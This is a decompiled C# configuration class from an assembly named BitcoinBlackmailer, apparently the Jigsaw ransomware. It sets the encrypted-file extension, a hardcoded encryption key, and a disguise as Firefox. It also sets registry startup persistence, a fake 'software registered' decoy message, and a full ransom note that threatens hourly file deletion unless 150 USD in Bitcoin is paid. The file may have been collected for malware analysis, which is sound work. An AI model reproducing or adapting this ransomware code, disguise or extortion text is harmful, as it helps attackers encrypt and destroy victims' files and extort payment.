﻿// Decompiled with JetBrains decompiler
// Type: Main.Config
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\IEUser\Desktop\clean\jigsaw-tamp2-cleaned.exe

using Main.Tools;
using System;
using System.IO;

namespace Main
{
  internal static class Config
  {
    internal const string AssemblyProdutAndTitle = "Firefox";
    internal const string AssemblyCopyright = "Copyright 1999-2012 Firefox and Mozzilla developers. All rights reserved.";
    internal const string AssemblyVersion = "37.0.2.5583";
    internal const string EncryptionFileExtension = ".fun";
    internal const int MaxFilesizeToEncryptInBytes = 10000000;
    internal const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";
    internal static Config.StartModeType StartMode;
    internal static string ErrorMessage;
    internal static string ErrorTitle;
    internal static Windows.StartupMethodType StartupMethod;
    internal static string TempExeRelativePath;
    internal static string TempExePath;
    internal static string FinalExeRelativePath;
    internal static string FinalExePath;
    internal static string WorkFolderRelativePath;
    internal static string WorkFolderPath;
    internal static bool OnlyRunAfterSysRestart;
    internal static DateTime ActiveAfterDateTime;
    internal static bool Activated = false;
    internal static int TimerActivateCheckerInterval = 6000;
    internal static string WelcomeMessage;
    internal static string TaskMessage;
    internal static int RansomUsd;

    static Config()
    {
      string path1_1 = Config.smethod_0(Environment.SpecialFolder.ApplicationData);
      string path1_2 = Config.smethod_0(Environment.SpecialFolder.LocalApplicationData);
      Config.StartMode = Config.StartModeType.ErrorMessage;
      Config.ActiveAfterDateTime = new DateTime(2016, 4, 1);
      Config.ErrorMessage = "Congratulations. Your software has been registered. Confirmation code 994759" + Environment.NewLine + "Email us this code in the chat to active your software. It can take up to 48 hours.";
      Config.ErrorTitle = "Thank you";
      Config.StartupMethod = Windows.StartupMethodType.Registry;
      Config.TempExeRelativePath = "Drpbx\\drpbx.exe";
      Config.FinalExeRelativePath = "Frfx\\firefox.exe";
      Config.FinalExePath = Path.Combine(path1_1, Config.FinalExeRelativePath);
      Config.TempExePath = Path.Combine(path1_2, Config.TempExeRelativePath);
      Config.WorkFolderRelativePath = "System32Work\\";
      Config.WorkFolderPath = Path.Combine(path1_1, Config.WorkFolderRelativePath);
      if (!Directory.Exists(Config.WorkFolderPath))
        Directory.CreateDirectory(Config.WorkFolderPath);
      Config.OnlyRunAfterSysRestart = false;
      Config.WelcomeMessage = "Your computer files have been encrypted. Your photos, videos, documents, etc...." + Environment.NewLine + "But, don't worry! I have not deleted them, yet." + Environment.NewLine + "You have 24 hours to pay 150 USD in Bitcoins to get the decryption key." + Environment.NewLine + "Every hour files will be deleted. Increasing in amount every time." + Environment.NewLine + "After 72 hours all that are left will be deleted." + Environment.NewLine + Environment.NewLine + "If you do not have bitcoins Google the website localbitcoins." + Environment.NewLine + "Purchase 150 American Dollars worth of Bitcoins or .4 BTC. The system will accept either one." + Environment.NewLine + "Send to the Bitcoins address specified." + Environment.NewLine + "Within two minutes of receiving your payment your computer will receive the decryption key and return to normal." + Environment.NewLine + "Try anything funny and the computer has several safety measures to delete your files." + Environment.NewLine + "As soon as the payment is received the crypted files will be returned to normal." + Environment.NewLine + Environment.NewLine + "       Thank you        ";
      Config.RansomUsd = 150;
      Config.TaskMessage = "Please, send $" + (object) Config.RansomUsd + " worth of Bitcoin here:";
    }

    static string smethod_0(Environment.SpecialFolder specialFolder_0) => Environment.GetFolderPath(specialFolder_0);

    internal enum StartModeType
    {
      Debug,
      ErrorMessage,
      NothingHappens,
      DeleteItself,
    }
  }
}
